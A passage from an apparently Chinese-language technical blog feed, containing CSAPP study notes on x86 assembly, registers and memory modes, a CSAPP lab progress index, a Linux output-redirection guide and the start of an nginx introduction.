class="hljs-comment"># x = 6</span><br></code></pre></td></tr></table></figure><ul><li>jmp到跳转表</li><li>跳转表是一个数组，存储了不同case入口处的地址</li><li>由于每个存储地址的指针是8个字节，因此比例因子为8</li><li>基址为.L4，跳转的x存储在%rdi，则需要跳转到.L4 + x*8处，也即是jmp *.L4(,%rdi,8)</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，csapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP：程序的机器级表示-1</title>
    <link href="/p/3bf4a27/"/>
    <url>/p/3bf4a27/</url>
    
    <content type="html"><![CDATA[<h1 id="指令集架构"><a href="#指令集架构" class="headerlink" title="指令集架构"></a>指令集架构</h1><ul><li>Instruction Set Architecture，ISA</li><li>复杂指令集（Complex Instruction Set Computer）<ul><li>包含许多应用程序中很少使用的特定指令</li><li>x86</li></ul></li><li>精简指令集（Reduced Instruction Set Computer）<ul><li>包含的指令少</li><li>提供比较高的速度</li><li>处理器的尺寸更小，</li><li>以及较少的电力损耗</li><li>ARM、MIPS</li></ul></li></ul><h1 id="机器语言"><a href="#机器语言" class="headerlink" title="机器语言"></a>机器语言</h1><ul><li>机器码(Machine Code)，由01组成，是处理器执行的字节级程序（01序列）</li><li>每一条语句都是01组成</li><li>穿孔纸带保存程序(1打孔，0不打孔)</li></ul><p>举例：8086CPU完成运算 S = 768 + 12288 - 1280，对应机器码<br>101100000000000000000011<br>000001010000000000110000<br>001011010000000000000101 </p><h1 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h1><p>由汇编指令、伪指令等组成</p><ul><li>汇编码(Assembly Code)：机器指令的便于记忆和阅读的书写格式，人类可读，比如add 、 mov等</li></ul><blockquote><p>机器指令： 1000100111011000<br>操        作：寄存器bx的内容送到ax中<br>汇编指令：movw %bx, %ax</p></blockquote><ul><li>高级语言–&gt;汇编指令–&gt;汇编器–&gt;机器码–&gt;被计算机识别</li><li>汇编语言无可移植性，高级语言具有可移植性</li></ul><h2 id="AT-amp-T-汇编、Intel汇编格式的差别"><a href="#AT-amp-T-汇编、Intel汇编格式的差别" class="headerlink" title="AT&amp;T 汇编、Intel汇编格式的差别"></a>AT&amp;T 汇编、Intel汇编格式的差别</h2><table><thead><tr><th align="center"><strong>项</strong></th><th align="center"><strong>Intel</strong></th><th align="center"><strong>AT&amp;T</strong></th></tr></thead><tbody><tr><td align="center"><strong>寄存器名称</strong></td><td align="center">EAX</td><td align="center">%eax</td></tr><tr><td align="center"><strong>操作数顺序</strong></td><td align="center">operator D&lt;–S</td><td align="center">operator S–&gt;D</td></tr><tr><td align="center"><strong>立即数格式</strong></td><td align="center">无$符号</td><td align="center">有符号，如 $0x1A</td></tr><tr><td align="center"><strong>操作数长度</strong></td><td align="center">由word ptr指定</td><td align="center">由movq/movb指定</td></tr><tr><td align="center"><strong>间接寻址方式</strong></td><td align="center">mov eax, [ebx+3]</td><td align="center">movl 3(%ebx) ,%eax</td></tr><tr><td align="center"><strong>变址寻址方式</strong></td><td align="center">mov [ebx + eax*8 + array],ecx</td><td align="center">movl %ecx,array(%ebx,%eax,8)</td></tr><tr><td align="center"><strong>汇编器</strong></td><td align="center">nasm</td><td align="center">gas</td></tr></tbody></table><p>关于操作数大小：</p><ul><li>AT&amp;T语法：以’b’, ‘w’和 ‘l’为后缀指明内存访问长度是 byte(8-bit), word(16-bit)还是long(32-bit)</li><li>Intel语法：’byte ptr’, ‘word ptr’和’dword ptr’</li></ul><table><thead><tr><th>Intel Code</th><th>AT&amp;T Code</th></tr></thead><tbody><tr><td>mov eax,1</td><td>movl $1, %eax</td></tr><tr><td>mov ebx,0ffh</td><td>movl $0x0ff,%ebx,</td></tr><tr><td>int 80h</td><td>int $0x80</td></tr><tr><td>mov ebx,eax</td><td>movl %eax,%ebx</td></tr><tr><td>mov eax,[ecx]</td><td>movl (%ecx),%eax</td></tr><tr><td>mov eax,[ecx+3]</td><td>movl 3(ecx),eax</td></tr><tr><td>mov eax,[ebx+20h]</td><td>movl 0x20(%ebx),%eax</td></tr><tr><td>add eax,[ebx+ecx*2h]</td><td>addl (%ebx,%ecx,%0x2),%eax</td></tr><tr><td>lea eax,[ebx+ecx]</td><td>leal (%ebx,%ecx),%eax</td></tr><tr><td>sub eax,[ebx+ecx*4h-20h]</td><td>subl -0x20(%ebx,%ecx,0x4),%eax</td></tr></tbody></table><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><ul><li>CPU内部的高速储存单元，访问速度远高于内存</li><li>rdx、edx、dx分别表示64位、32位、16位的dx寄存器<ul><li>r：Register</li><li>e：extend</li></ul></li></ul><table><thead><tr><th>32位</th><th>16位</th><th>高  8  位</th><th>低  8  位</th></tr></thead><tbody><tr><td>EAX</td><td>AX</td><td>AH</td><td>AL</td></tr><tr><td>EBX</td><td>BX</td><td>BH</td><td>BL</td></tr><tr><td>ECX</td><td>CX</td><td>CH</td><td>CL</td></tr><tr><td>EDX</td><td>DX</td><td>DH</td><td>DL</td></tr></tbody></table><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><ul><li>EAX <ul><li>拓展累加寄存器，乘法、除法被自动使用</li><li>保存函数的返回值</li></ul></li><li>ECX 循环计数器</li><li>ESI、EDI 源变址寄存器、目的变址寄存器</li><li>ESP 栈顶指针</li><li>EBP 栈底指针</li></ul><h2 id="段寄存器（segment-register）"><a href="#段寄存器（segment-register）" class="headerlink" title="段寄存器（segment register）"></a>段寄存器（segment register）</h2><p>实模式下，段地址：偏移地址构成地址，而段寄存器保存段地址</p><ul><li>CS：存放代码段地址</li><li>SS：存放堆栈段地址</li><li>DS<ul><li>实模式下：数据段地址</li><li>保护模式下：段描述符表的地址</li></ul></li><li>ES：拓展段寄存器</li><li>FS：标志段寄存器</li><li>GS：全局段寄存器</li></ul><h2 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h2><ul><li>指令（Instuctor）指针（pointer）寄存器</li><li>始终存放下一条要被CPU执行的指令的地址</li></ul><h2 id="EFLAGS"><a href="#EFLAGS" class="headerlink" title="EFLAGS"></a>EFLAGS</h2><p>反映CPU执行的算术和逻辑操作结果的状态标志</p><ul><li>OF：overflow flag</li><li>ZF：zero flag</li><li>CF：carry flag</li><li>SF：sign flag</li><li>AF：assistant carry flag</li><li>PF：parity flag</li></ul><h2 id="系统寄存器"><a href="#系统寄存器" class="headerlink" title="系统寄存器"></a>系统寄存器</h2><p>仅允许运行在最高特权级的程序（例如：操作系统内核）访问的寄存器，任何应用程序禁止访问</p><ul><li>中断描述符表寄存器IDTR：保存中断描述符表的地址。</li><li>全局描述符表寄存器GDTR<ul><li>保存全局描述符表的地址，全局段描述符表包含了任务状态段和局部描述符表的指针</li></ul></li><li>局部描述符表寄存器LDTR<ul><li>保存当前正在运行的程序的代码段、数据段和堆栈段的指针</li></ul></li><li>任务寄存器<ul><li>保存当前执行任务的任务状态段的地址。</li></ul></li><li>调试寄存器<ul><li>用于调试程序时设置断点</li></ul></li></ul><h1 id="实模式-amp-保护模式的异同"><a href="#实模式-amp-保护模式的异同" class="headerlink" title="实模式&amp;保护模式的异同"></a>实模式&amp;保护模式的异同</h1><h2 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h2><ul><li>20位地址总线，可以访问1MB(0~FFFFF)内存（$2^{20}$=1MB）</li><li>16位数据线，需要内存分段才能表示20位地址</li><li>段：内存空间被划分为64KB的段</li><li>段地址存放于16位的段寄存器中（CS、DS、ES、SS）</li><li>物理地址=段地址*10H+偏移地址</li><li>辨析<ul><li>数据总线：数据总线为32位，说明可以同时处理32位的数据，也即字长为32位（CPU一次能并行处理的二进制位数）</li><li>地址总线：决定处理器的寻址范围。20位地址总线，可以访问1MB内存</li></ul></li></ul><h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><ul><li>32位地址总线寻址，每个程序可寻址4GB内存：0~FFFFFFFF（$2^{32}=2^{30}*4$）</li><li>段寄存器(CS、DS、SS、ES、FS和GS)指向段描述符表项<ul><li>操作系统使用段描述符表定位程序使用的段的位置</li><li>CS存放代码段描述符表项的地址</li><li>DS存放数据段描述符表项的地址</li><li>SS存放堆栈段描述符表项的地址</li></ul></li><li>所有段被映射到32位物理地址空间</li><li>程序至少两个段：代码段和数据段(CS、DS)</li><li>分页：将一个段分割成称为页（Pages）的4KB的内存块</li><li>缺页：当任务运行时，当前活跃的执行代码保留在内存中，而程序中当前未使用的部分，将继续保存在磁盘上。<strong>当CPU需要执行的当前代码存储在磁盘上时，产生一个缺页错误，引起所需页面的换进(从磁盘载入内存)</strong></li><li>分页意义：通过分页以及页面的换进、换出，一台内存有限的计算机上可以同时运行多个大程序，让人感觉这台机器的内存无限大，因此称为虚拟内存</li></ul><h1 id="计算机是怎么运行的"><a href="#计算机是怎么运行的" class="headerlink" title="计算机是怎么运行的"></a>计算机是怎么运行的</h1><ul><li>取指令<ul><li>在地址CS:IP/EIP/RIP处取出指令（分别对应实模式、32位、64位）</li><li>IP/EIP/RIP = IP/EIP/RIP + 所读取指令的长度</li><li>IP/EIP/RIP指向下一条指令</li></ul></li><li>执行指令<ul><li>执行</li><li>取指令</li></ul></li><li>重复上面过程</li></ul><h1 id="lea-指令解析"><a href="#lea-指令解析" class="headerlink" title="lea 指令解析"></a>lea 指令解析</h1><blockquote><p>它（指leaq）的指令形式是从内存读数据到寄存器，但实际上它根本就没有引用内存。他的第一个操作数看上去是一个内存引用，但该指令并不是从指定的位置读入数据，而是将有效地址写入到目的操作数</p></blockquote><p>lea：load effective address</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">leaq (%rdi,%rsi,<span class="hljs-number">4</span>), %rax<br></code></pre></td></tr></table></figure><ul><li>源操作数：(%rdi,%rsi,4)</li><li>目的操作数：%rax</li><li>作用：将源操作数的地址，也即是%rdi + 4 * %rsi 装载入%rax。%rax=%rdi + 4 * %rsi </li></ul><p>leal [A, B, C] D 的语义就是 D = A + B * C</p><ul><li>可以把A理解为数组的基地址</li><li>C理解为数组的某个元素</li><li>该指令就是将A数组的第C个元素的地址存到D里面<h1 id="Intel汇编代码示例"><a href="#Intel汇编代码示例" class="headerlink" title="Intel汇编代码示例"></a>Intel汇编代码示例</h1></li></ul><figure class="highlight arm"><figcaption><span>Assembly</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ARM"><span class="hljs-comment">; hello.asm</span><br><span class="hljs-symbol">.data</span> <span class="hljs-comment">; 数据段声明</span><br><span class="hljs-symbol">msg</span> db <span class="hljs-string">&quot;Hello, world! --------- Intel ASM .&quot;</span>, <span class="hljs-number">0xA</span> <span class="hljs-comment">; 要输出的字符串</span><br><span class="hljs-symbol">len</span> <span class="hljs-meta">equ</span> $ - msg <span class="hljs-comment">; </span><br><span class="hljs-symbol">.text</span> <span class="hljs-comment">; 代码段声明</span><br><span class="hljs-symbol">global</span> _start <span class="hljs-comment">; 指定入口函数</span><br><span class="hljs-symbol">_start:</span> <span class="hljs-comment">; 在屏幕上显示一个字符串</span><br><span class="hljs-keyword">mov</span> edx, len <span class="hljs-comment">; 参数三：字符串长度</span><br><span class="hljs-keyword">mov</span> ecx, msg <span class="hljs-comment">; 参数二：要显示的字符串</span><br><span class="hljs-keyword">mov</span> ebx, <span class="hljs-number">1</span> <span class="hljs-comment">; 参数一：文件描述符(stdout)</span><br><span class="hljs-keyword">mov</span> eax, <span class="hljs-number">4</span> <span class="hljs-comment">; 系统调用号(sys_write)</span><br><span class="hljs-symbol">int</span> <span class="hljs-number">0x80</span> <span class="hljs-comment">; 调用内核功能</span><br><span class="hljs-comment">; 退出程序</span><br><span class="hljs-keyword">mov</span> ebx, <span class="hljs-number">0</span> <span class="hljs-comment">; 参数一：退出代码</span><br><span class="hljs-keyword">mov</span> eax, <span class="hljs-number">1</span> <span class="hljs-comment">; 系统调用号(sys_exit)</span><br><span class="hljs-symbol">int</span> <span class="hljs-number">0x80</span> <span class="hljs-comment">; 调用内核功能</span><br></code></pre></td></tr></table></figure><h1 id="AT-amp-T汇编代码示例"><a href="#AT-amp-T汇编代码示例" class="headerlink" title="AT&amp;T汇编代码示例"></a>AT&amp;T汇编代码示例</h1><figure class="highlight arm"><figcaption><span>Assembly</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ARM">  <span class="hljs-comment">#hello.s</span><br><span class="hljs-symbol">.data</span> # 数据段声明<br><span class="hljs-symbol">msg</span> : .string <span class="hljs-string">&quot;Hello, world! --------- AT&amp;T ASM\r\n &quot;</span> # 要输出的字符串<br><span class="hljs-symbol">len</span> = . - msg # 字串长度<br><span class="hljs-symbol">.text</span> # 代码段声明<br><span class="hljs-symbol">.global</span> _start # 指定入口函数<br><span class="hljs-symbol">_start:</span> # 在屏幕上显示一个字符串<br><span class="hljs-symbol">movl</span> $len, %edx # 参数三：字符串长度<br><span class="hljs-symbol">movl</span> $msg, %ecx # 参数二：要显示的字符串<br><span class="hljs-symbol">movl</span> <span class="hljs-number">$1</span>, %ebx # 参数一：文件描述符(stdout)<br><span class="hljs-symbol">movl</span> <span class="hljs-number">$4</span>, %eax # 系统调用号(sys_write)<br><span class="hljs-symbol">int</span> <span class="hljs-number">$0x80</span> # 调用内核功能<br><span class="hljs-comment"># 退出程序</span><br><span class="hljs-symbol">movl</span> <span class="hljs-number">$0</span>,%ebx # 参数一：退出代码<br><span class="hljs-symbol">movl</span> <span class="hljs-number">$1</span>,%eax # 系统调用号(sys_exit)<br><span class="hljs-symbol">int</span> <span class="hljs-number">$0x80</span> # 调用内核功能<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，csapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-lab</title>
    <link href="/p/d4c22a8b/"/>
    <url>/p/d4c22a8b/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/csapp1.png"></p><p><strong>学 CSAPP 不做实验，就像四大名著不看红楼梦，说明这个人文学造诣和自我修养不足，他理解不了这种内在的阳春白雪的高雅艺术，他只能看到外表的辞藻堆砌，参不透其中深奥的精神内核，他整个人的层次就卡在这里了，只能度过一个相对失败的人生。</strong></p><h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><ul><li><p><a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-s22/www/schedule.html">csapp 课程网站</a></p></li><li><p><a href="https://csapp.cs.cmu.edu/3e/students.html">CS:APP3e Student Site</a></p></li><li><p><a href="http://csapp.cs.cmu.edu/3e/labs.html">lab 主页</a></p></li></ul><p>在主页获取到handout后，解压：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tar</span> xvf cprogramminglab-handout.tar <br></code></pre></td></tr></table></figure><h1 id="进度"><a href="#进度" class="headerlink" title="进度"></a>进度</h1><ul><li><input checked="" disabled="" type="checkbox"> <a href="https://gls.show/p/3b50ff2c/">CSAPP-lab0：C Programming Lab</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://gls.show/p/6d79108/">CSAPP-lab1：Data lab</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://gls.show/p/44962f68/">CSAPP-lab2：Bomb-lab</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://gls.show/p/db3828d1/">CSAPP-lab3：buflab</a></li><li><input disabled="" type="checkbox"> <a href="">CSAPP-lab4：shell lab</a></li></ul><h1 id="lab0"><a href="#lab0" class="headerlink" title="lab0"></a>lab0</h1><p><a href="https://gls.show/p/3b50ff2c/">CSAPP-lab0：C Programming Lab</a></p><h1 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h1><p><a href="https://gls.show/p/6d79108/">CSAPP-lab1：Data lab</a></p><h1 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h1><p><a href="https://gls.show/p/44962f68/">CSAPP-lab2：Bomb-lab</a></p><h1 id="lab3"><a href="#lab3" class="headerlink" title="lab3"></a>lab3</h1><p><a href="https://gls.show/p/db3828d1/">CSAPP-lab3：buflab</a></p><h1 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h1><p><a href="">CSAPP-lab4：shell lab</a></p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux输入输出重定向</title>
    <link href="/p/5da01755/"/>
    <url>/p/5da01755/</url>
    
    <content type="html"><![CDATA[<h1 id="标准输入、标准输出、标准错误"><a href="#标准输入、标准输出、标准错误" class="headerlink" title="标准输入、标准输出、标准错误"></a>标准输入、标准输出、标准错误</h1><ul><li><p>STDIN，文件描述符：0；标准输入，默认从键盘读取信息；</p></li><li><p>STDOUT，文件描述符：1；标准输出，默认将输出结果输出至终端；</p></li><li><p>STDERR，文件描述符：2；标准错误，默认将输出结果输出至终端</p></li></ul><h1 id="常用重定向命令"><a href="#常用重定向命令" class="headerlink" title="常用重定向命令"></a>常用重定向命令</h1><p>将命令的标准输出重定向到文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SomeCommand &gt; SomeFile.txt  <br></code></pre></td></tr></table></figure><p>将命令的标准输出重定向、<strong>追加</strong>到文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SomeCommand &gt;&gt; SomeFile.txt<br></code></pre></td></tr></table></figure><p>将命令的标准输出、标准错误重定向到文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SomeCommand &amp;&gt; SomeFile.txt  <br></code></pre></td></tr></table></figure><p>将命令的标准输出、标准错误重定向、<strong>追加</strong>到文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SomeCommand &amp;&gt;&gt; SomeFile.txt  <br></code></pre></td></tr></table></figure><p>使用tee命令，将命令的标准输出、标准错误重定向到文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SomeCommand 2&gt;&amp;1 | tee SomeFile.txt<br></code></pre></td></tr></table></figure><p>来自Stack Overflow的表格：（n.e.表示不存在）</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">          ||<span class="hljs-string"> visible in terminal </span>||<span class="hljs-string">   visible in file   </span>||<span class="hljs-string"> existing</span><br><span class="hljs-string">  Syntax  </span>||<span class="hljs-string">  StdOut  </span>|<span class="hljs-string">  StdErr  </span>||<span class="hljs-string">  StdOut  </span>|<span class="hljs-string">  StdErr  </span>||<span class="hljs-string">   file   </span><br><span class="hljs-string">==========++==========+==========++==========+==========++===========</span><br><span class="hljs-string">    &gt;     </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string"> overwrite</span><br><span class="hljs-string">    &gt;&gt;    </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string">  append</span><br><span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<br>   2&gt;     ||<span class="hljs-string">   yes    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string"> overwrite</span><br><span class="hljs-string">   2&gt;&gt;    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">  append</span><br><span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<br>   &amp;&gt;     ||<span class="hljs-string">    no    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string"> overwrite</span><br><span class="hljs-string">   &amp;&gt;&gt;    </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">  append</span><br><span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<br> |<span class="hljs-string"> tee    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string"> overwrite</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> tee -a </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string">  append</span><br><span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<br> n.e. (<span class="hljs-symbol">*</span>) ||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string"> overwrite</span><br><span class="hljs-string"> n.e. (*) </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">  append</span><br><span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<br>|<span class="hljs-string">&amp; tee    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string"> overwrite</span><br><span class="hljs-string"></span>|<span class="hljs-string">&amp; tee -a </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">  append</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vim">tee<br><br>  Read from standard <span class="hljs-built_in">input</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">write</span> <span class="hljs-keyword">to</span> standard output <span class="hljs-built_in">and</span> <span class="hljs-keyword">files</span> (<span class="hljs-built_in">or</span> commands).<br>  More information: http<span class="hljs-variable">s:</span>//www.gnu.org/software/coreutils/tee.<br><br>  - Copy standard <span class="hljs-built_in">input</span> <span class="hljs-keyword">to</span> each <span class="hljs-keyword">file</span>, <span class="hljs-built_in">and</span> also <span class="hljs-keyword">to</span> standard outpu<span class="hljs-variable">t:</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;example&quot;</span> | tee path/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">file</span><br><br>  - Append <span class="hljs-keyword">to</span> the given <span class="hljs-keyword">files</span>, <span class="hljs-keyword">do</span> not overwrite:<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;example&quot;</span> | tee -<span class="hljs-keyword">a</span> path/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">file</span><br><br>  - <span class="hljs-keyword">Print</span> standard <span class="hljs-built_in">input</span> <span class="hljs-keyword">to</span> the terminal, <span class="hljs-built_in">and</span> also pipe it into another program <span class="hljs-keyword">for</span> further processin<span class="hljs-variable">g:</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;example&quot;</span> | tee /dev/tty | xargs <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;[%s]&quot;</span><br><br>  - Create <span class="hljs-keyword">a</span> directory called <span class="hljs-string">&quot;example&quot;</span>, <span class="hljs-built_in">count</span> the <span class="hljs-keyword">number</span> of characters in <span class="hljs-string">&quot;example&quot;</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">write</span> <span class="hljs-string">&quot;example&quot;</span> <span class="hljs-keyword">to</span> the termina<span class="hljs-variable">l:</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;example&quot;</span> | tee &gt;(xargs <span class="hljs-built_in">mkdir</span>) &gt;(wc -<span class="hljs-keyword">c</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>nginx高性能web服务器详解</title>
    <link href="/p/913c096e/"/>
    <url>/p/913c096e/</url>
    
    <content type="html"><![CDATA[<h1 id="常见web服务器介绍"><a href="#常见web服务器介绍" class="headerlink" title="常见web服务器介绍"></a>常见web服务器介绍</h1><ul><li>Apache<ul><li>a patchy server</li><li>占据web服务器的半壁江山</li><li>开源</li></ul></li><li>Tomcat<ul><li>轻量级应用服务器</li><li>无法满足复杂业务场景</li><li>免费、开源</li><li>体积小，易于安装部署</li></ul></li><li>Nginx<ul><li>免费、开源、后来居上</li><li>高性能http服务器</li><li>功能多（包括支持反向代理、负载均衡、IMAP/POP3代理服务、SSL等功能）</li><li>常用功能：负载均衡、反向代理、web缓存</li></ul></li></ul><h1 id="Nginx的安装"><a href="#Nginx的安装" class="headerlink" title="Nginx的安装"></a>Nginx的安装</h1><p>官网上的几个版本：</p><ul><li>Mainline version：目前主力在做的版本，开发版</li><li>Stable version：最新稳定版，生产环境上建议使用的版本</li><li>Legacy versions：遗留的老版本的稳定版</li></ul><p>安装：</p><ul><li>由于Nginx升级频繁，Linux下建议通过编译源码进行安装（gcc + automake）</li><li> sudo apt install nginx 命令可以直接安装</li><li> 安装完成后，运行 whereis nginx 以发现程序的安装位置</li><li>pidof nginx可以定位Nginx的进程号</li></ul><p>一些特殊文件：</p><ul><li>index.html：服务启动成功后默认显示的页面</li><li>logs目录：服务器日志</li><li>sbin目录：只有Nginx一个文件（可执行程序）</li></ul><h1 id="Nginx服务的启停控制"><a href="#Nginx服务的启停控制" class="headerlink" title="Nginx服务的启停控制"></a>Nginx服务的启停控制</h1><p>列出进程：</p><ul><li>pidof</li><li>cat nginx.pid</li><li>ps -ef | grep nginx</li></ul><p>常用指令：</p><ul><li>kill signal pid 杀掉进程</li><li>sudo nginx -t  测试Nginx配置文件语法</li><li>sudo nginx -v 版本</li><li>sudo systemctl start nginx 启动nginx</li><li>sudo systemctl stop nginx 停止nginx</li><li>sudo systemctl restart nginx 重启nginx</li><li>sudo systemctl reload nginx 配置更改时，重新加载nginx</li><li>sudo systemctl status nginx 查看Nginx状态</li></ul><h1 id="Nginx基础配置"><a href="#Nginx基础配置" class="headerlink" title="Nginx基础配置"></a>Nginx基础配置</h1><p>nginx的主要配置都放在nginx.conf文件中，#后面的内容被注释</p><p>conf文件的结构：</p><ul><li>全局块<ul><li>默认配置文件从最开始到events之间的内容</li><li>包括运行Nginx的用户、允许的进程数、日志路径、配置引入等，影响nginx服务器整体运行</li></ul></li><li>events块<ul><li>影响Nginx服务器与用户的网络连接，包括选择何种事件驱动模型处理连接请求、每个worker process可以同时支持的最大连接数等</li></ul></li><li>http块<ul><li>代理、缓存、日志定义等功能在此配置</li><li>该块内可以包含自己的全局块，也可以包含server块</li></ul></li><li>server块<ul><li>每个server块相当于一个虚拟主机，内部可以有多个主机联合提供服务，一起对外提供服务</li><li>server块指令的作用域在本server块</li><li>server块可以包含自己的全局块和多个location块</li></ul></li><li>location块<ul><li>本质是server块的一个指令，由于重要性在此单列</li><li>作用：基于Nginx服务器接收到的请求字符串进行匹配，对特定请求进行处理<ul><li>地址定向</li><li>数据缓存</li><li>应答控制等</li></ul></li><li><a 